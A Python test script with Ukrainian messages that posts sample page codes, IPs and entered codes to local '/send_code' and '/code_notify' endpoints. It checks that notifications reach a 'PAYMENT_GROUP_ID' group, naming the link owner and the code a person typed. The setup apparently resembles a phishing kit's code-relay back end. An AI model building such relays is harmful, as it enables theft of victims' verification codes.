#!/usr/bin/env python3
"""
Тестовий скрипт для перевірки нового формату повідомлення про код
"""

import requests
import json

def test_code_message_format():
    """Тестує новий формат повідомлення про код"""
    print("🧪 Тестування нового формату повідомлення про код...")
    
    # Тест 1: З усіма даними
    print("\n1. Тест з усіма даними...")
    try:
        data = {
            'page_code': 'test-123',
            'ip': '127.0.0.1',
            'code': 'ABC123'
        }
        response = requests.post('http://127.0.0.1:8080/send_code', json=data, timeout=5)
        print(f"   Відповідь: {response.status_code} - {response.text}")
        print("   ✅ Має з'явитися повідомлення з усіма рядками")
    except Exception as e:
        print(f"   ❌ Помилка: {e}")
    
    # Тест 2: Без коду
    print("\n2. Тест без коду...")
    try:
        data = {
            'page_code': 'test-456',
            'ip': '127.0.0.2'
        }
        response = requests.post('http://127.0.0.1:8080/send_code', json=data, timeout=5)
        print(f"   Відповідь: {response.status_code} - {response.text}")
        print("   ✅ Має з'явитися повідомлення без рядка 'Код'")
    except Exception as e:
        print(f"   ❌ Помилка: {e}")
    
    # Тест 3: Без page_code
    print("\n3. Тест без page_code...")
    try:
        data = {
            'ip': '127.0.0.3',
            'code': 'XYZ789'
        }
        response = requests.post('http://127.0.0.1:8080/send_code', json=data, timeout=5)
        print(f"   Відповідь: {response.status_code} - {response.text}")
        print("   ✅ Має з'явитися повідомлення з 'Не указано' для посилання")
    except Exception as e:
        print(f"   ❌ Помилка: {e}")

def test_code_notify_direct():
    """Тестує code_notify напряму"""
    print("\n🧪 Тестування code_notify напряму...")
    
    try:
        data = {
            'page_code': 'direct-test',
            'ip': '127.0.0.4',
            'code': 'DIRECT123'
        }
        response = requests.post('http://127.0.0.1:8081/code_notify', json=data, timeout=5)
        print(f"   Відповідь: {response.status_code} - {response.text}")
        print("   ✅ Має з'явитися повідомлення в PAYMENT_GROUP_ID")
    except Exception as e:
        print(f"   ❌ Помилка: {e}")

if __name__ == "__main__":
    print("🚀 Запуск тестування формату повідомлення про код...")
    print("⚠️  Переконайтеся, що сервер запущений на порту 8080 та бот на порту 8081!")
    print("=" * 60)
    
    test_code_message_format()
    test_code_notify_direct()
    
    print("\n" + "=" * 60)
    print("✅ Тестування завершено!")
    print("\n📋 Що перевірити:")
    print("1. Чи з'явилися повідомлення про код в PAYMENT_GROUP_ID")
    print("2. Чи правильно відображається формат повідомлення")
    print("3. Чи показується username власника посилання")
    print("4. Чи показується код, який ввела людина")
    print("5. Чи приховуються рядки з 'Не указано'")
